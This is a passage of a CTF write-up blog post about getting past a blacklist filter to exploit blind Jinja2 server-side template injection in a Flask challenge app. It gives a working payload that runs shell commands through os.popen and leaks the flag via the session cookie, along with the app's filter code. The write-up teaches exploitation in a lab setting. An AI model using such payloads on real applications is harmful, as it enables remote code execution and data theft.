string">&#x27;for&#x27;</span><span class="token punctuation">,</span> <span class="token string">&#x27;sum&#x27;</span><span class="token punctuation">,</span> <span class="token string">&#x27;%s&#x27;</span><span class="token punctuation">,</span> <span class="token string">&#x27;{}&#x27;</span><span class="token punctuation">,</span> <span class="token string">&#x27;\\&#x27;</span><span class="token punctuation">,</span> <span class="token string">&#x27;*&#x27;</span><span class="token punctuation">,</span> <span class="token string">&#x27;&amp;&#x27;</span><span class="token punctuation">,</span><span class="token string">&quot;{{&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;}}&quot;</span><span class="token punctuation">,</span> <span class="token string">&#x27;[]&#x27;</span><span class="token punctuation">,</span><span class="token string">&quot;&#x27;&#x27;&quot;</span><span class="token punctuation">,</span><span class="token string">&#x27;&quot;&quot;&#x27;</span><span class="token punctuation">,</span><span class="token string">&#x27;|&#x27;</span><span class="token punctuation">,</span><span class="token string">&#x27;==&#x27;</span><span class="token punctuation">,</span><span class="token string">&#x27;~&#x27;</span><span class="token punctuation">]</span>
</span><span class="code-line">
</span><span class="code-line">
</span><span class="code-line"><span class="token keyword">def</span> <span class="token function">check_filter</span><span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
</span><span class="code-line">    <span class="token builtin">input</span> <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span>
</span><span class="code-line">    <span class="token keyword">if</span> <span class="token builtin">input</span><span class="token punctuation">.</span>count<span class="token punctuation">(</span><span class="token string">&#x27;.&#x27;</span><span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token number">1</span> <span class="token keyword">or</span> <span class="token builtin">input</span><span class="token punctuation">.</span>count<span class="token punctuation">(</span><span class="token string">&#x27;:&#x27;</span><span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token number">1</span> <span class="token keyword">or</span> <span class="token builtin">input</span><span class="token punctuation">.</span>count<span class="token punctuation">(</span><span class="token string">&#x27;/&#x27;</span><span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token number">1</span> <span class="token keyword">or</span> <span class="token builtin">input</span><span class="token punctuation">.</span>count<span class="token punctuation">(</span><span class="token string">&#x27;%&#x27;</span><span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token number">2</span><span class="token punctuation">:</span>
</span><span class="code-line">        <span class="token keyword">return</span> <span class="token boolean">False</span>
</span><span class="code-line">    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">115</span><span class="token punctuation">:</span>
</span><span class="code-line">        <span class="token keyword">for</span> char <span class="token keyword">in</span> <span class="token builtin">input</span><span class="token punctuation">:</span>
</span><span class="code-line">            <span class="token keyword">if</span> char <span class="token keyword">in</span> string<span class="token punctuation">.</span>digits<span class="token punctuation">:</span>
</span><span class="code-line">                <span class="token keyword">return</span> <span class="token boolean">False</span>
</span><span class="code-line">        <span class="token keyword">for</span> i <span class="token keyword">in</span> UNALLOWED<span class="token punctuation">:</span>
</span><span class="code-line">            <span class="token keyword">if</span> i <span class="token keyword">in</span> <span class="token builtin">input</span><span class="token punctuation">:</span>
</span><span class="code-line">                <span class="token keyword">return</span> <span class="token boolean">False</span>
</span><span class="code-line">        <span class="token keyword">return</span> <span class="token boolean">True</span>
</span><span class="code-line">    <span class="token keyword">return</span> <span class="token boolean">False</span>
</span></code></pre></div>
<p>So basically, we can’t use <code>if</code> / <code>for</code> / <code>lipsum</code>.</p>
<p>Upon reading Jinja2 docs, I’ve found that we can use <code>Assignments</code> using the function <code>set</code>.</p>
<div class="relative"><pre><code class="language-py code-highlight"><span class="code-line"><span class="token punctuation">{</span><span class="token operator">%</span> <span class="token builtin">set</span> a<span class="token operator">=</span>payload <span class="token operator">%</span><span class="token punctuation">}</span>
</span></code></pre></div>
<p>As <code>lipsum</code> is filtered because of <code>sum</code>, we’ll use the payload that we created in the first challenge with <code>cycler</code>.</p>
<div class="relative"><pre><code class="language-py code-highlight"><span class="code-line">cycler<span class="token punctuation">[</span><span class="token string">&#x27;__in&#x27;</span> <span class="token string">&#x27;it__&#x27;</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">&#x27;__glo&#x27;</span> <span class="token string">&#x27;bals__&#x27;</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">&#x27;os&#x27;</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">&#x27;popen&#x27;</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">&#x27;id&#x27;</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">&#x27;rea&#x27;</span> <span class="token string">&#x27;d&#x27;</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
</span></code></pre></div>
<p>Our payload to exfiltrate the flag will be:</p>
<div class="relative"><pre><code class="language-py code-highlight"><span class="code-line">session<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">&#x27;f&#x27;</span><span class="token punctuation">:</span>cycler<span class="token punctuation">[</span><span class="token string">&#x27;__ini&#x27;</span> <span class="token string">&#x27;t__&#x27;</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">&#x27;__glo&#x27;</span> <span class="token string">&#x27;bals__&#x27;</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">&#x27;os&#x27;</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">&#x27;popen&#x27;</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">&#x27;tac /flag&#x27;</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">&#x27;re&#x27;</span> <span class="token string">&#x27;ad&#x27;</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
</span></code></pre></div>
<p>Our final payload is:</p>
<div class="relative"><pre><code class="language-py code-highlight"><span class="code-line"><span class="token punctuation">{</span><span class="token operator">%</span> <span class="token builtin">set</span> a<span class="token operator">=</span>session<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">&#x27;f&#x27;</span><span class="token punctuation">:</span>cycler<span class="token punctuation">[</span><span class="token string">&#x27;__ini&#x27;</span> <span class="token string">&#x27;t__&#x27;</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">&#x27;__glo&#x27;</span> <span class="token string">&#x27;bals__&#x27;</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">&#x27;os&#x27;</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">&#x27;popen&#x27;</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">&#x27;tac /flag&#x27;</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">&#x27;re&#x27;</span> <span class="token string">&#x27;ad&#x27;</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span> <span class="token operator">%</span><span class="token punctuation">}</span>
</span></code></pre></div>
<div class="relative"><pre><code class="code-highlight"><span class="code-line">[len] 114
</span><span class="code-line">True
</span></code></pre></div>
<p>Now, we can use it and get the cookie containing the flag.</p>
<div class="relative"><pre><code class="language-shell code-highlight"><span class="code-line">$ flask-unsign -d -c <span class="token string">&quot;eyJmIjoiY3Jld3s2NmM5MGMwNzkzYzQ1MmY2YjY4MA5ZWYxYzI4YM3OX0iLCJ1c2VyIjoiYWRtaW4ifQ.Y1v7AQ.5NZKstHzeVcckdiYqsLuOWfvLfw&quot;</span>
</span><span class="code-line"><span class="token punctuation">{</span><span class="token string">&#x27;f&#x27;</span><span class="token builtin class-name">:</span> <span class="token string">&#x27;crew{66c90c0793c452f6b68209ef1c28ac79}&#x27;</span>, <span class="token string">&#x27;user&#x27;</span><span class="token builtin class-name">:</span> <span class="token string">&#x27;admin&#x27;</span><span class="token punctuation">}</span>
</span></code></pre></div>
<p>This is all for this post, I hope you liked these two writeups!</p></div><div class="pt-6 pb-6 text-sm text-gray-700 dark:text-gray-300"><a target="_blank" rel="nofollow" href="https://mobile.twitter.com/search?q=https%3A%2F%2Fsekai.team%2Fblog%2Fcrew-ctf-2022%2FEzChall">Discuss on Twitter</a> • <a target="_blank" rel="noopener noreferrer" href="https://github.com/blueset/sekai.team/blob/master/data/blog/crew-ctf-2022/EzChall.md">View on GitHub</a></div></div><footer><div class="text-sm font-medium leading-5 divide-gray-200 xl:divide-y dark:divide-gray-700 xl:col-start-1 xl:row-start-2"><div class="py-4 xl:py-8"><h2 class="text-xs tracking-wide text-gray-500 uppercase dark:text-gray-400">Tags</h2><div class="flex flex-wrap"><a class="mr-3 text-sm font-medium uppercase text-primary-500 hover:text-primary-600 dark:hover:text-primary-400" href="/tags/crew-ctf-2022/">CREW-CTF-2022</a><a class="mr-3 text-sm font-medium uppercase text-primary-500 hover:text-primary-600 dark:hover:text-primary-400" href="/tags/web/">Web</a><a class="mr-3 text-sm font-medium uppercase text-primary-500 hover:text-primary-600 dark:hover:text-primary-400" href="/tags/ssti/">SSTI</a><a class="mr-3 text-sm font-medium uppercase text-primary-500 hover:text-primary-600 dark:hover:text-primary-400" href="/tags/filter/">Filter</a><a class="mr-3 text-sm font-medium uppercase text-primary-500 hover:text-primary-600 dark:hover:text-primary-400" href="/tags/waf/">WAF</a><a class="mr-3 text-sm font-medium uppercase text-primary-500 hover:text-primary-600 dark:hover:text-primary-400" href="/tags/blacklist/">Blacklist</a></div></div><div class="flex justify-between py-4 xl:block xl:space-y-8 xl:py-8"><div><h2 class="text-xs tracking-wide text-gray-500 uppercase dark:text-gray-400">Previous Article</h2><div class="text-primary-500 hover:text-primary-600 dark:hover:text-primary-400"><a href="/blog/ritsec-ctf-2022/hamxor/">RITSEC CTF 2022 – Hamxor</a></div></div><div><h2 class="text-xs tracking-wide text-gray-500 uppercase dark:text-gray-400">Next Article</h2><div class="text-primary-500 hover:text-primary-600 dark:hover:text-primary-400"><a href="/blog/nahamcon-ctf-2022/gitops/">NahamCon CTF 2022 – GitOps</a></div></div></div></div><div class="pt-4 xl:pt-8"><a class="text-primary-500 hover:text-primary-600 dark:hover:text-primary-400" href="/blog/">← Back to the blog</a></div></footer></div></div></article></div></main><footer><div class="flex flex-col items-center mt-16"><div class="flex mb-3 space-x-4"><div class="flex mb-3 space-x-4"><a class="text-sm text-gray-500 transition hover:text-gray-600" target="_blank" rel="noopener noreferrer" href="mailto:project.sekai@sekai.team"><span class="sr-only"><span class="w-6">mail</span></span><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" class="fill-current text-gray-700 w-6 h-6 dark:text-gray-200 hover:text-blue-500 dark:hover:text-blue-400"><path d="M2.003 5.884 10 9.882l7.997-3.998A2 2 0 0 0 16 4H4a2 2 0 0 0-1.997 1.884z"></path><path d="m18 8.118-8 4-8-4V14a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8.118z"></path></svg></a><a class="text-sm text-gray-500 transition hover:text-gray-600" target="_blank" rel="noopener noreferrer" href="https://github.com/project-sekai-ctf"><span class="sr-only"><span class="w-6">github</span></span><svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" class="fill-current text-gray-700 w-6 h-6 dark:text-gray-200 hover:text-blue-500 dark:hover:text-blue-400"><path d="M12 .297c-6.63 0-12 5.373-12 12 0 5.303 3.438 9.8 8.205 11.385.6.113.82-.258.82-.577 0-.285-.01-1.04-.015-2.04-3.338.724-4.042-1.61-4.042-1.61C4.422 18.07 3.633 17.7 3.633 17.7c-1.087-.744.084-.729.084-.729 1.205.084 1.838 1.236 1.838 1.236 1.07 1.835 2.809 1.305 3.495.998.108-.776.417-1.305.76-1.605-2.665-.3-5.466-1.332-5.466-5.93 0-1.31.465-2.38 1.235-3.22-.135-.303-.54-1.523.105-3.176 0 0 1.005-.322 3.3 1.23.96-.267 1.98-.399 3-.405 1.02.006 2.04.138 3 .405 2.28-1.552 3.285-1.23 3.285-1.23.645 1.653.24 2.873.12 3.176.765.84 1.23 1.91 1.23 3.22 0 4.61-2.805 5.625-5.475 5.92.42.36.81 1.096.81 2.22 0 1.606-.015 2.896-.015 3.286 0 .315.21.69.825.57C20.565 22.092 24 17.592 24 12.297c0-6.627-5.373-12-12-12"></path></svg></a><a class="text-sm text-gray-500 transition hover:text-gray-600" target="_blank" rel="noopener noreferrer" href="https://www.linkedin.com/company/project-sekai-ctf/"><span class="sr-only"><span class="w-6">linkedin</span></span><svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" class="fill-current text-gray-700 w-6 h-6 dark:text-gray-200 hover:text-blue-500 dark:hover:text-blue-400"><path d="M20.447 20.452h-3.554v-5.569c0-1.328-.027-3.037-1.852-3.037-1.853 0-2.136 1.445-2.136 2.939v5.667H9.351V9h3.414v1.561h.046c.477-.9 1.637-1.85 3.37-1.85 3.601 0 4.267 2.37 4.267 5.455v6.286zM5.337 7.433a2.062 2.062 0 0 1-2.063-2.065 2.064 2.064 0 1 1 2.063 2.065zm1.782 13.019H3.555V9h3.564v11.452zM22.225 0H1.771C.792 0 0 .774 0 1.729v20.542C0 23.227.792 24 1.771 24h20.451C23.2 24 24 23.227 24 22.271V1.729C24 .774 23.2 0 22.222 0h.003z"></path></svg></a><a class="text-sm text-gray-500 transition hover:text-gray-600" target="_blank" rel="noopener noreferrer" href="https://twitter.com/ProjectSEKAIctf"><span class="sr-only"><span class="w-6">twitter</span></span><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" class="fill-current text-gray-700 w-6 h-6 dark:text-gray-200 hover:text-blue-500 dark:hover:text-blue-400"><path d="M23.953 4.57a10 10 0 0 1-2.825.775 4.958 4.958 0 0 0 2.163-2.723c-.951.555-2.005.959-3.127 1.184a4.92 4.92 0 0 0-8.384 4.482C7.69 8.095 4.067 6.13 1.64 3.162a4.822 4.822 0 0 0-.666 2.475c0 1.71.87 3.213 2.188 4.096a4.904 4.904 0 0 1-2.228-.616v.06a4.923 4.923 0 0 0 3.946 4.827 4.996 4.996 0 0 1-2.212.085 4.936 4.936 0 0 0 4.604 3.417 9.867 9.867 0 0 1-6.102 2.105c-.39 0-.779-.023-1.17-.067a13.995 13.995 0 0 0 7.557 2.209c9.053 0 13.998-7.496 13.998-13.985 0-.21 0-.42-.015-.63A9.935 9.935 0 0 0 24 4.59z"></path></svg></a><a class="text-sm text-gray-500 transition hover:text-gray-600" target="_blank" rel="noopener noreferrer" href="https://ctftime.org/team/169557"><span class="sr-only"><span class="w-6">ctftime</span></span><svg width="24" height="24" xmlns="http://www.w3.org/2000/svg" class="fill-current text-gray-700 w-6 h-6 dark:text-gray-200 hover:text-blue-500 dark:hover:text-blue-400"><path d="M24 0v24H0V0h24Zm-3.077 3.077L7.067 3.076 16 12.816 10.369 19l-2.195-2.612 3.476-3.573-8.574-9.609v17.717h17.847V3.077Z" fill="currentColor" fill-rule="evenodd"></path></svg></a></div></div><div class="flex mb-2 space-x-2 text-sm text-gray-500 dark:text-gray-400"><a href="/">Project SEKAI</a><div> • </div><div>© 2024</div><div> • </div><div><a href="https://1a23.com">1A23 Studio</a></div></div><div class="mb-8 text-xs text-center text-gray-200 dark:text-gray-700">This website is in no way affiliated with any of the following individuals or organizations.<!-- --> <a target="_blank" rel="noopener noreferrer" href="https://github.com/timlrx/tailwind-nextjs-starter-blog">Tailwind Nextjs Theme</a> © Timothy Lim and contributors; <a target="_blank" rel="noopener noreferrer" href="https://pjsekai.sega.jp/">Project SEKAI: Colorful Stage! feat. Hatsune Miku</a> © SEGA / © Craft Egg Inc. Developed by Colorful Palette; <a target="_blank" rel="noopener noreferrer" href="https://ec.crypton.co.jp/pages/prod/virtualsinger">Character Vocal Series</a> © Crypton Future Media, INC. <a target="_blank" rel="noopener noreferrer" href="https://www.piapro.net">www.piapro.net</a> All rights reserved.</div></div></footer></div></div></div><script id="__NEXT_DATA__" type="application/json">{"props":{"pageProps":{"post":{"mdxSource":"var Component=(()=\u003e{var r=Object.create;var t=Object.defineProperty;var p=Object.getOwnPropertyDescriptor;var d=Object.getOwnPropertyNames;var h=Object.getPrototypeOf,u=Object.prototype.hasOwnProperty;var l=a=\u003et(a,\"__esModule\",{value:!0});var m=(a,s)=\u003e()=\u003e(s||a((s={exports:{}}).exports,s),s.exports),N=(a,s)=\u003e{l(a);for(var c in s)t(a,c,{get:s[c],enumerable:!0})},k=(a,s,c)=\u003e{if(s\u0026\u0026typeof s==\"object\"||typeof s==\"function\")for(let e of d(s))!u.call(a,e)\u0026\u0026e!==\"default\"\u0026\u0026t(a,e,{get:()=\u003es[e],enumerable:!(c=p(s,e))||c.enumerable});return a},g=a=\u003ek(l(t(a!=null?r(h(a)):{},\"default\",a\u0026\u0026a.__esModule\u0026\u0026\"default\"in a?{get:()=\u003ea.default,enumerable:!0}:{value:a,enumerable:!0})),a);var o=m((I,i)=\u003e{i.exports=_jsx_runtime});var w={};N(w,{default:()=\u003ef,frontmatter:()=\u003ey});var n=g(o()),y={title:\"Crew CTF 2022 \\u2013 EzChall \u0026 EzChall Again\",date:\"2022-04-17\",draft:!1,authors:[\"elleuch\"],tags:[\"CREW CTF 2022\",\"Web\",\"SSTI\",\"Filter\",\"WAF\",\"Blacklist\"],summary:\"Blind SSTI with filters\"};function b(a={}){let{wrapper:s}=a.components||{};return s?(0,n.jsx)(s,Object.assign({},a,{children:(0,n.jsx)(c,{})})):c();function c(){let e=Object.assign({h1:\"h1\",a:\"a\",span:\"span\",blockquote:\"blockquote\",p:\"p\",br:\"br\",pre:\"pre\",code:\"code\",ul:\"ul\",li:\"li\"},a.components);return(0,n.jsxs)(n.Fragment,{children:[(0,n.jsxs)(e.h1,{id:\"ezchall-web-906\",children:[(0,n.jsx)(e.a,{\"aria-hidden\":\"true\",tabIndex:\"-1\",href:\"#ezchall-web-906\",children:(0,n.jsx)(e.span,{className:\"icon icon-link\"})}),\"EzChall (Web, 906)\"]}),`\n`,(0,n.jsxs)(e.blockquote,{children:[`\n`,(0,n.jsxs)(e.p,{children:[\"I am looking for a way out for myself, can you help me?\",(0,n.jsx)(e.br,{}),`\n`,\"Author: Nino#5160\"]}),`\n`,(0,n.jsxs)(e.p,{children:[(0,n.jsx)(e.a,{href:\"http://ezchall.crewctf-2022.crewc.tf:1337/\",children:\"http://ezchall.crewctf-2022.crewc.tf:1337/\"}),(0,n.jsx)(e.br,{}),`\n`,\"Mirror: \",(0,n.jsx)(e.a,{href:\"http://193.105.207.19:8005/\",children:\"http://193.105.207.19:8005/\"})]}),`\n`,(0,n.jsx)(e.p,{children:\"Attachment: ExChall.zip\"}),`\n`]}),`\n`,(0,n.jsx)(e.p,{children:\"In this blogpost, I\\u2019ll be showcasing my thought proccess of solving these two challenges.\"}),`\n`,(0,n.jsx)(e.p,{children:\"So, we\\u2019re given the source code of the application.\"}),`\n`,(0,n.jsx)(e.pre,{children:(0,n.jsxs)(e.code,{className:\"code-highlight\",children:[(0,n.jsx)(e.span,{className:\"code-line\",children:`src\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`    templates\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`    app.py\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`    filter.py\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`    mybase64.py\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`    requirements.txt\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`docker-compose.yml\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`Dockerfile\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`flag\n`})]})}),`\n`,(0,n.jsxs)(e.p,{children:[\"Let\\u2019s first start by poking at \",(0,n.jsx)(e.code,{children:\"app.py\"}),\" where we have 2 Routes (login/dashboard).\"]}),`\n`,(0,n.jsx)(e.p,{children:\"Nothing interesting in the second route other than the admin hardcoded credentials\"}),`\n`,(0,n.jsxs)(e.blockquote,{children:[`\n`,(0,n.jsxs)(e.p,{children:[(0,n.jsx)(e.code,{children:\"admin\"}),\": \",(0,n.jsx)(e.code,{children:\"cGFzcyBpcyBhZG1pbiA/Pw==\"})]}),`\n`]}),`\n`,(0,n.jsx)(e.pre,{className:\"language-py\",children:(0,n.jsxs)(e.code,{className:\"language-py code-highlight\",children:[(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token keyword\",children:\"def\"}),\" \",(0,n.jsx)(e.span,{className:\"token function\",children:\"login\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"\t\",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"if\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'user'\"}),\" \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"in\"}),\" session\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"\t\t\",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"return\"}),\" redirect\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"url_for\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token string\",children:\"'dashboard'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"\t\",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"else\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"\t\t\",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"if\"}),\" request\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"method \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"==\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:'\"POST\"'}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"\t\t\tuser\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" passwd \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"''\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"''\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"\t\t\tuser \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" request\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"form\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"[\"}),(0,n.jsx)(e.span,{className:\"token string\",children:\"'user'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"]\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"\t\t\tpasswd \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" request\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"form\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"[\"}),(0,n.jsx)(e.span,{className:\"token string\",children:\"'passwd'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"]\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"\t\t\t\",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"if\"}),\" user \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"==\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'admin'\"}),\" \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"and\"}),\" bdecode\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"passwd\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"==\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'pass is admin ??'\"}),\" \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"and\"}),\" \",(0,n.jsx)(e.span,{className:\"token builtin\",children:\"len\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"passwd\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"==\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"24\"}),\" \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"and\"}),\" passwd \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"!=\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'cGFzcyBpcyBhZG1pbiA/Pw=='\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"\t\t\t\tsession\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"[\"}),(0,n.jsx)(e.span,{className:\"token string\",children:\"'user'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"]\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),` user\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"\t\t\t\t\",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"return\"}),\" redirect\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"url_for\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token string\",children:\"'dashboard'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"\t\t\t\",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"return\"}),\" render_template\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token string\",children:\"'login.html'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" msg\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),(0,n.jsx)(e.span,{className:\"token string\",children:\"'Incorrect !'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"\t\t\",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"return\"}),\" render_template\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token string\",children:\"'login.html'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]})]})}),`\n`,(0,n.jsxs)(e.p,{children:[\"For the dashboard endpoint, we have a straightforward blind SSTI vulnerability if the we validate the checker \",(0,n.jsx)(e.code,{children:\"check_filter\"}),\".\"]}),`\n`,(0,n.jsx)(e.pre,{className:\"language-py\",children:(0,n.jsxs)(e.code,{className:\"language-py code-highlight\",children:[(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token keyword\",children:\"def\"}),\" \",(0,n.jsx)(e.span,{className:\"token function\",children:\"dashboard\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"\t\",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"if\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'user'\"}),\" \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"not\"}),\" \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"in\"}),\" session\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"\t\t\t\",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"return\"}),\" redirect\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"url_for\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token string\",children:\"'login'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"\t\",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"else\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"\t\t\",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"if\"}),\" request\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"args\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"get\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token string\",children:\"'payload'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,n.jsx)(e.span,{className:\"token 